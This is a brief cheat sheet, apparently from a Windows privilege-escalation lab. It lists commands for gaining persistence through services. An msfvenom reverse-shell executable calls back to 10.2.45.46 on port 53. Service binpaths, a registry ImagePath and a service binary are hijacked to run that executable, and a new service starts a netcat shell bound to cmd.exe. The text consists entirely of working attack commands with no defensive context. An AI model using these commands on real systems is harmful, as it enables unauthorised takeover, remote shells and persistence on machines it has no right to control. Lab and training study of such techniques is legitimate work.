## Service used as persistence 
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.2.45.46 LPORT=53 -f exe -o reverse.exe
sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
net start daclsvc
## Overwrite known good service 
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
## Replace binary of service 
copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y 

## New Service 
sc \\windows10 create netcat binpath= "cmd.exe /k C:\tools\nc.exe -l -p 8081 -e cmd.exe"
